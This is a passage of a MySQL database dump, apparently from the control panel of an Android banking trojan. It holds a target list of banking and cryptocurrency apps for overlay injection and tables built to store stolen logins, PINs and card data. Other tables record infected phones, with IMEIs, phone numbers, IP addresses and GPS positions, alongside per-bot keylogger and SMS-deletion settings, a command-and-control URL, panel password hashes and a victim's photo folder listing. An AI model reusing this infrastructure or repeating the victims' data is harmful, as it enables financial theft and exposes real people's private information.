'(RO)hr.asseco.android.jimba.mUCI.ro','ro_hr.asseco.android.jimba.mUCI.ro,hr.asseco.android.jimba.mUCI.ro'),(1147,'(RO)may.maybank.android','ro_may.maybank.android,may.maybank.android'),(1148,'(RO)ro.btrl.mobile','ro_ro.btrl.mobile,ro.btrl.mobile'),(1150,'(Crypt)piuk.blockchain.android','blockchaine,piuk.blockchain.android,info.blockchain.merchant'),(1151,'(Crypt)com.coinbase.android','com.coinbase.android,com.coinbase.android,com.portfolio.coinbase_tracker'),(1152,'(Crypt)com.unocoin.unocoinwallet','com.unocoin.unocoinwallet,com.unocoin.unocoinwallet,com.unocoin.unocoinmerchantPoS'),(1153,'(Crypt)com.localbitcoinsmbapp','localbitcoin,com.localbitcoinsmbapp,com.thunkable.android.manirana54.LocalBitCoins,com.thunkable.android.manirana54.LocalBitCoins_unblock,com.localbitcoins.exchange,com.coins.bit.local,com.coins.ful.bit,com.jamalabbasii1998.localbitcoin'),(1154,'(Crypt)zebpay.Application','zebpay,zebpay.Application'),(1155,'(Crypt)com.binance.dev','tr_com.binance.dev,com.binance.dev'),(1156,'(Crypt)com.bitfinex.bfxapp','com.bitfinex.bfxapp,com.bitfinex.bfxapp'),(1157,'(Crypt)com.mycelium.wallet','com.mycelium.wallet,com.mycelium.wallet'),(1158,'(Crypt)com.bitmarket.trader','com.bitmarket.trader,com.bitmarket.trader'),(1159,'(Crypt)com.plunien.poloniex','com.plunien.poloniex,com.plunien.poloniex'),(1160,'(Crypt)com.Plus500','com.Plus500,com.Plus500'),(1162,'ru.bzwbk.bzwbk24','ru.bzwbk.bzwbk24'),(1163,'com.advantage.RaiffeisenBank','com.advantage.RaiffeisenBank'),(1164,'com.bestbuy.android','com.bestbuy.android');
/*!40000 ALTER TABLE `injection` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `injs`
--

DROP TABLE IF EXISTS `injs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `injs` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `idbot` varchar(200) NOT NULL,
  `name` varchar(300) NOT NULL,
  `country` varchar(10) DEFAULT NULL,
  `login` varchar(300) DEFAULT NULL,
  `password` varchar(300) DEFAULT NULL,
  `pin` varchar(300) DEFAULT NULL,
  `comments` varchar(2500) DEFAULT NULL,
  `params1` varchar(100) DEFAULT NULL,
  `params2` varchar(100) DEFAULT NULL,
  `vopros1` varchar(100) DEFAULT NULL,
  `vopros2` varchar(100) DEFAULT NULL,
  `otvet1` varchar(100) DEFAULT NULL,
  `cc` varchar(50) DEFAULT NULL,
  `monthyear` varchar(50) DEFAULT NULL,
  `cvv` varchar(5) DEFAULT NULL,
  `otvet2` varchar(100) DEFAULT NULL,
  `f_name` varchar(100) DEFAULT NULL,
  `l_name` varchar(100) DEFAULT NULL,
  `phone` varchar(35) DEFAULT NULL,
  `dateBrith` varchar(15) DEFAULT NULL,
  `logs` varchar(3000) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `injs`
--

LOCK TABLES `injs` WRITE;
/*!40000 ALTER TABLE `injs` DISABLE KEYS */;
/*!40000 ALTER TABLE `injs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kliets`
--

DROP TABLE IF EXISTS `kliets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kliets` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(500) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` varchar(20) DEFAULT NULL,
  `color` varchar(20) DEFAULT NULL,
  `av` varchar(500) DEFAULT NULL,
  `requestInjProc` int(5) DEFAULT NULL,
  `requestGeoloc` int(5) DEFAULT NULL,
  `requestSMS` int(5) DEFAULT NULL,
  `seconds` varchar(50) DEFAULT NULL,
  `accessibility` varchar(5) DEFAULT NULL,
  `playprotect` varchar(10) DEFAULT NULL,
  `doze` varchar(10) DEFAULT NULL,
  `ip` varchar(20) DEFAULT NULL,
  `step` varchar(500) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `id_2` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=76 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kliets`
--

LOCK TABLES `kliets` WRITE;
/*!40000 ALTER TABLE `kliets` DISABLE KEYS */;
INSERT INTO `kliets` VALUES (50,'751a7e1e83b492b6','(NO)Indefined','7.0','ru','ru.sberbankmobile,','Redmi Note 4 (mido)','2019-03-19 22:53:06','2019-03-19 21:51:11','0','0','0','0','1','tag',NULL,NULL,0,1,0,'3300','0','2','0','95.153.132.252','6'),(55,'25028829763585','(Megafon)+79279411051','5.0.1','ru','com.ebay.mobile,ru.sberbankmobile,ru.alfabank.mobile.android,','Galaxy S II (GT-I9210)','2019-03-20 10:19:11','2019-03-19 22:18:07','0','0',NULL,'0','1','FLASHPLAYER',NULL,NULL,1,1,0,'25','0','2','1','195.68.142.14','0'),(58,'59186f4236e5b5de','(NO)Indefined','8.0.0','us','com.att.myWireless,com.amazon.mShop.android.shopping,','SM-G965U (star2qltesq)','2019-03-20 13:06:05','2019-03-19 22:55:49','0','0','0','0','0','tag',NULL,NULL,1,1,0,'140525','1','2','1','68.129.231.83','2311'),(59,'7e711f500d34495c','(NO)Indefined','7.0','ru','','IMPRESS CLICK (IMPRESS_CLICK)','2019-03-20 10:00:21','2019-03-19 23:20:40','0','0',NULL,'0','1','tag',NULL,NULL,1,1,0,'9900','1','2','1','176.59.65.23','330'),(61,'ee759f2b09bc6661','(ROSTELECOM)','5.1','ru','ru.sberbankmobile,com.ebay.mobile,','HTC Desire 728G dual sim (a50cmg_dwg_00401)','2019-03-20 02:08:40','2019-03-20 02:05:39','0','0',NULL,'0','1','tag',NULL,NULL,1,1,0,'175','1','2','1','176.59.67.134','0'),(62,'955d61f45dbb7b4c','(NO)Indefined','7.1.2','ua','ru.alfabank.mobile.ua.android,','M6 Note (meizu_M6Note)','2019-03-20 02:57:31','2019-03-20 02:53:59','0','0',NULL,'0','0','tag',NULL,NULL,1,0,0,'250','1','2','1','194.28.71.2','1'),(63,'1d18a5ad2258b601','(MTN)','6.0.1','af','','SM-J510FN (j5xnltexx)','2019-03-20 04:43:34','2019-03-20 04:43:04','0','0',NULL,'0','1','tag',NULL,NULL,1,0,0,'27525','1','2','1','154.59.46.237','543'),(64,'6320f25213fb1151','(Vodafone UA)+380507479759','7.1.2','ua','','Redmi 4A (rolex)','2019-03-20 07:42:53','2019-03-20 07:11:48','0','0','0','0','0','tag',NULL,NULL,1,1,0,'11775','1','2','0','46.133.128.8','455'),(65,'c44c8ff07835cd2a','(NO)Indefined','9','ru','ru.sberbankmobile,','SM-G955F (dream2ltexx)','2019-03-20 13:06:21','2019-03-20 08:22:57','0','0','0','0','0','tag',NULL,'',1,1,0,'15725','1','2','1','178.155.4.88','396'),(66,'2470c789aa421bc9','(NO)Indefined','9','ru','ru.vtb24.mobilebanking.android,ru.mw,ru.alfabank.mobile.android,ru.sberbankmobile,ru.sberbankmobile,','COL-L29 (COL-L29RU)','2019-03-20 12:58:34','2019-03-20 08:37:03','0','0',NULL,'0','1','tag',NULL,NULL,1,0,0,'9875','1','2','1','176.59.99.129','502'),(67,'3496a4439d3b18f2','(Tele2)','6.0','ru','ru.sberbankmobile,','M5c (meizu_M5c)','2019-03-20 08:48:19','2019-03-20 08:45:40','0','0',NULL,'0','0','tag',NULL,NULL,1,0,0,'75','0','2','0','176.59.64.39','47'),(68,'c0c7ec3f58136ee5','(NO)Indefined','7.1.2','ru','ru.mw,com.idamob.tinkoff.android,ru.sberbankmobile,','Redmi 5A (riva)','2019-03-20 09:48:01','2019-03-20 09:47:37','0','0',NULL,'0','1','tag',NULL,NULL,0,1,0,'25','0','2','0','176.59.100.97','1'),(69,'c2dfe3a28981764c','(NO)Indefined','8.0.0','ru','','PRA-TL10 (PRA-TL10)','2019-03-20 10:05:07','2019-03-20 10:05:07','0','0',NULL,NULL,NULL,'tag',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),(70,'a7cc5dc49742aa83','(Tele2)','5.1.1','ru','','SM-G531H (grandprimeve3gxx)','2019-03-20 13:06:15','2019-03-20 11:17:49','0','0','0','0','0','tag',NULL,NULL,1,1,0,'5250','1','2','1','176.59.195.34','34'),(71,'511dfce8c339c9c9','(NO)Indefined','6.0.1','ru','ru.alfabank.mobile.android,','SM-G900F (kltexx)','2019-03-20 11:35:39','2019-03-20 11:23:33','0','0',NULL,'0','0','tag',NULL,NULL,1,1,0,'475','0','2','0','176.59.204.128','7'),(73,'f33a342bde84c9ea','(NO)Indefined','7.0','ru','ru.vtb24.mobilebanking.android,','SM-A710F (a7xeltexx)','2019-03-20 13:06:24','2019-03-20 12:03:01','0','0','1','0','1','tag',NULL,NULL,1,1,0,'1950','1','2','1','213.151.13.146','56'),(74,'c1d5929c76d3250e','(NO)Indefined','9','ru','ru.vtb24.mobilebanking.android,ru.sberbankmobile,','COL-L29 (COL-L29RU)','2019-03-20 13:06:13','2019-03-20 12:07:18','0','0','0','0','1','tag',NULL,NULL,1,1,0,'3075','1','2','1','176.59.210.20','69');
/*!40000 ALTER TABLE `kliets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `markers`
--

DROP TABLE IF EXISTS `markers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `markers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL,
  `lat` float(10,6) NOT NULL,
  `lng` float(10,6) NOT NULL,
  `type` varchar(30) NOT NULL,
  `provayder` varchar(30) DEFAULT NULL,
  `time` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=201 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `markers`
--

LOCK TABLES `markers` WRITE;
/*!40000 ALTER TABLE `markers` DISABLE KEYS */;
INSERT INTO `markers` VALUES (197,'c1d5929c76d3250e',56.778000,60.636501,'V','GPS','2019-03-20 13:06'),(198,'a7cc5dc49742aa83',56.820499,60.581600,'N','NETWORK','2019-03-20 13:06'),(199,'59186f4236e5b5de',40.637299,-74.087997,'h','NETWORK','2019-03-20 13:04'),(200,'c44c8ff07835cd2a',45.026001,38.902199,'p','NETWORK','2019-03-20 13:05');
/*!40000 ALTER TABLE `markers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` int(60) unsigned NOT NULL AUTO_INCREMENT,
  `IMEI` varchar(1000) NOT NULL,
  `inject` varchar(3000) DEFAULT NULL,
  `del_sms` varchar(3000) DEFAULT NULL,
  `state` varchar(5) DEFAULT NULL,
  `avtootvet_num` varchar(50) DEFAULT NULL,
  `avtootvet_sig1` varchar(3000) DEFAULT NULL,
  `avtootvet_sig2` varchar(3000) DEFAULT NULL,
  `avtootvet_true` varchar(5) DEFAULT NULL,
  `checkforeground` varchar(10) DEFAULT NULL,
  `keylogger` varchar(10) DEFAULT NULL,
  `checkrecord` varchar(10) DEFAULT NULL,
  `recordseconds` varchar(50) DEFAULT NULL,
  `lookscreen` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=47 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES (1,'24fd52b09b945115','','0','0','','0','0','1','0','0','0','','0'),(2,'7545215865204010','/200','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(3,'ee5e627249168cb9','/1163//21/22/23','0','0','','0','0','1','0','0','0','','0'),(4,'6bfce2c63e4a15c8','//2','0','1','','0','0','1','0','0','0','','0'),(5,'e6238ff10120ea75','/','0','0','','0','0','1','0','0','0','','0'),(6,'8254c9a0522beac1','/2/8/15/16/17','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(7,'cd193ad29e314a18','','0','0','','0','0','1','0','0','0','','0'),(8,'361b91482fe05b3','/374','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(9,'2d58b9333103dc7b','/2/8/16/17/21/22/23/1163','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(10,'d833b155fb075337','/200','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(11,'871544fa3caeb847','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(12,'1dff69d0879dc738','/200/201/202/371/381','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(13,'f62e37bb69537d53','/382','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(14,'59186f4236e5b5de','//4','0','0','','1','1','1','0','0','0','','0'),(15,'e441eba8338257d','//4','0','0','','0','0','1','0','0','0','','0'),(16,'d4622905c0bdddba','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(17,'8a7aa14826992f74','/568','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(18,'5063ef55d5223dc3','//4','0','1','','0','0','1','0','0','0','','0'),(19,'1d18a5ad2258b601','//4','0','0','','0','0','1','0','0','0','','0'),(20,'5e7cceae75e0e25d','//4','0','1','','0','0','1','0','0','0','','0'),(21,'21915940201bd81d','//4','0','1','','0','0','1','0','0','0','','0'),(22,'2ca96633256e3f54','//4','0','1','','0','0','1','0','0','0','','0'),(23,'6320f25213fb1151','/4//2','0','0','','0','0','1','0','0','0','','0'),(24,'78881b9493a6310a','//2/4','0','1','','0','0','1','0','0','0','','0'),(25,'6142fb976a7bfe09','/','0','0','','0','0','1','0','1','0','','0'),(26,'b0ede5abd118003d','/23','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(27,'955d61f45dbb7b4c','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(28,'352d1c92a2c8b82e','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(29,'564f4b69af0e490d','/23','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(30,'5b540b49914ada85','/2','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(31,'352f1df6a2fa87e0','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(32,'50cae5831bb8b877','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(33,'8ed773d5b75c3fe5','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(34,'751a7e1e83b492b6','//20','0','1','','0','0','1','0','0','0','','0'),(35,'4059a8da3bfab3b5','','0','1',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(36,'7e711f500d34495c','//20','0','0','','0','0','0','0','0','0','','0'),(37,'ee759f2b09bc6661','//20/202','0','1','','0','0','1','0','0','0','','0'),(38,'25028829763585','//20','0','0','','0','0','1','0','0','0','','0'),(39,'c44c8ff07835cd2a','/20/','0','0','','1','1','1','0','0','0','','0'),(40,'2470c789aa421bc9','//20/22','0','0','','1','1','1','0','0','0','','0'),(41,'3496a4439d3b18f2','/20','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(42,'c0c7ec3f58136ee5','/20/21','0','1',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(43,'a7cc5dc49742aa83','','0','0',NULL,'1','1','1',NULL,NULL,NULL,NULL,NULL),(44,'511dfce8c339c9c9','','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(45,'f33a342bde84c9ea','/22','0','0',NULL,'0','0','1',NULL,NULL,NULL,NULL,NULL),(46,'c1d5929c76d3250e','/20/22','0','0',NULL,'1','1','1',NULL,NULL,NULL,NULL,NULL);
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settingsall`
--

DROP TABLE IF EXISTS `settingsall`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settingsall` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `hash` varchar(500) DEFAULT NULL,
  `intInterval` varchar(50) DEFAULT NULL,
  `checksms` varchar(5) DEFAULT NULL,
  `checkhidesms` varchar(5) DEFAULT NULL,
  `checkgeolocation` varchar(5) DEFAULT NULL,
  `checkInjectionsApps` varchar(10) DEFAULT NULL,
  `secondInjectionsApps` varchar(250) DEFAULT NULL,
  `checkRequestGeolocation` varchar(10) DEFAULT NULL,
  `secondRequestGeolocation` varchar(250) DEFAULT NULL,
  `checkGrab_auto` varchar(10) DEFAULT NULL,
  `Grab_auto` varchar(1000) DEFAULT NULL,
  `secondGrab_auto` varchar(200) DEFAULT NULL,
  `checkInjGrab` varchar(10) DEFAULT NULL,
  `InjGrab` varchar(6000) DEFAULT NULL,
  `secondInjGrab` varchar(250) DEFAULT NULL,
  `checkPhoneContacts` varchar(10) DEFAULT NULL,
  `secondPhoneContacts` varchar(250) DEFAULT NULL,
  `checkStartGeolocation` varchar(10) DEFAULT NULL,
  `secondStartGeolocation` varchar(250) DEFAULT NULL,
  `urls` varchar(4000) CHARACTER SET armscii8 DEFAULT NULL,
  `urlInj` varchar(3000) DEFAULT NULL,
  `findfiles` varchar(2000) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settingsall`
--

LOCK TABLES `settingsall` WRITE;
/*!40000 ALTER TABLE `settingsall` DISABLE KEYS */;
INSERT INTO `settingsall` VALUES (1,'5QETZyDftsbQBrK','14000','1','','','','','','','1','','10','1','|1','6700','','','','','http://colbrte.top','http://colbrte.top/jisjdfioasf','');
/*!40000 ALTER TABLE `settingsall` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `smsspam`
--

DROP TABLE IF EXISTS `smsspam`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `smsspam` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `number` varchar(20) CHARACTER SET utf8 NOT NULL,
  `status` varchar(5) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `smsspam`
--

LOCK TABLES `smsspam` WRITE;
/*!40000 ALTER TABLE `smsspam` DISABLE KEYS */;
/*!40000 ALTER TABLE `smsspam` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_users`
--

DROP TABLE IF EXISTS `t_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_users` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `login` varchar(500) NOT NULL,
  `password` varchar(500) NOT NULL,
  `right_` varchar(20) NOT NULL,
  `status` varchar(20) NOT NULL,
  `tag` varchar(1500) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_users`
--

LOCK TABLES `t_users` WRITE;
/*!40000 ALTER TABLE `t_users` DISABLE KEYS */;
INSERT INTO `t_users` VALUES (34,'admin','b34912e584b42722ddbb7f6a17705be0','admin','Action',''),(35,'Traf','d92029cd8ca3c69dad8d87e6627c928a','traffic','Action','');
/*!40000 ALTER TABLE `t_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ws`
--

DROP TABLE IF EXISTS `ws`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ws` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `lastconnect` varchar(100) DEFAULT NULL,
  `botid` varchar(50) DEFAULT NULL,
  `command` varchar(200) DEFAULT NULL,
  `statusserver` int(2) DEFAULT NULL,
  `path` varchar(400) DEFAULT NULL,
  `FileFolder` varchar(3000) DEFAULT NULL,
  `statusfilefolder` varchar(2) DEFAULT NULL,
  `DownloadFile` varchar(2500) DEFAULT NULL,
  `vncscreen` varchar(20) DEFAULT NULL,
  `sound` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ws`
--

LOCK TABLES `ws` WRITE;
/*!40000 ALTER TABLE `ws` DISABLE KEYS */;
INSERT INTO `ws` VALUES (1,'2019-03-20 13:06','a7cc5dc49742aa83','',1,'/storage/emulated/0/DCIM/YouCam Perfect','!!!!!!!!2018-04-11-01-47-08-660.jpg|2018-04-25-16-34-49-060.jpg|2018-04-29-20-13-52-173.jpg|2018-04-25-16-32-52-648.jpg|2018-09-01-13-50-51-822.jpg|2018-09-01-13-55-27-245.jpg|2018-09-01-13-57-54-496.jpg|2018-09-01-14-37-32-224.jpg|2019-01-15-22-55-28-549.jpg|!!!!','0',NULL,'7.jpg','701');
/*!40000 ALTER TABLE `ws` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-03-20 13:06:32
